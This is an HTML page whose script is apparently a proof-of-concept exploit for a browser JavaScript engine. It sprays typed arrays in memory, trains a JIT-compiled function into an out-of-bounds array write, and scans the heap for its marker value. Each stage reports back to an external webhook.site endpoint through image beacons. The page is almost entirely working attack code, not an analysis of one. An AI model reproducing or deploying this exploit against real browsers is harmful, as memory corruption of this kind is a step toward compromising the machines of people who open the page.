<html><body><script>
const SINK="https://webhook.site/2e90e5ef-e377-4add-8fd5-05d360fce7f7";
function b(t,v){ try{ new Image().src = SINK + '?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,120)); }catch(e){} }
b('start', navigator.userAgent.slice(0,60));
const N=2000, MARKER=1.2345678901234e-300;
let spray=[]; for(let i=0;i<N;i++){ let a=new Float64Array(64); a.fill(i+1); spray.push(a); }
b('spray', N);
var fake=new Uint32Array(10); for(var i=0;i<10;i++) fake[i]=i+1;
fake[0]=1;fake[1]=3;fake[2]=2;fake[3]=4;fake[4]=5;fake[5]=6;fake[6]=7;fake[7]=8;fake[8]=9;
var tahir=0x1;
// PoC 7965 (identyczny z potwierdzonym) - ZMIANA: zapis MARKER (obserwowalny) zamiast 0x500
function poc(a){
  var oob_array=new Array(5); oob_array[0]=0x500;
  let just_a_variable=fake[0];
  let another_variable3=fake[7];
  if(a%7==0) another_variable3=0xff00000000;
  another_variable3=Math.max(another_variable3,tahir);
  another_variable3=another_variable3>>>0;
  var index=fake[3];
  var for_phi_modes=fake[6];
  let c=fake[1];
  for(var i=0;i<10;i++){
    if(a%3==0) just_a_variable=c;
    if(a%37==0) just_a_variable=fake[2];
    if(a%11==0) just_a_variable=fake[8];
    if(a%17==0) just_a_variable=fake[5];
    if(a%19==0) just_a_variable=fake[4];
    if(a%7==0&&i>=5){ for_phi_modes=just_a_variable; just_a_variable=another_variable3; }
    if(i>=6){ for(let j=0;j<5;j++){ if(a%5==0){ index=for_phi_modes; oob_array[index]=MARKER; } } }
    for_phi_modes=c; c=just_a_variable;
  }
  return [index, BigInt(just_a_variable)];
}
for(let i=2;i<0x500;i++) poc(i);
for(let i=0;i<50000;i++) poc(i%500+2);
b('warm','ok');
function scan(k){
  let hits=0;
  for(let i=0;i<N;i++){ let a=spray[i];
    if(a.length!==64){ b('HIT-len','k='+k+' i='+i+' len='+a.length); hits++; return hits; }
    for(let j=0;j<64;j++){ if(a[j]===MARKER){ b('HIT-mark','k='+k+' i='+i+' j='+j); hits++; return hits; } }
  }
  return hits;
}
let KS=[8,16,32,64,128,256,512,1024,2048,4096,8192,16384,32768,65536,131072];
for(let n=0;n<KS.length;n++){
  let k=KS[n]; fake[3]=k; fake[6]=k; fake[7]=k;
  try{ poc(7*5); poc(35); poc(140); }catch(e){ b('exc','k='+k+' '+String(e).slice(0,40)); }
  let h=scan(k);
  b('iter','k='+k+' hits='+h);
}
b('done','ok');
</script></body></html>
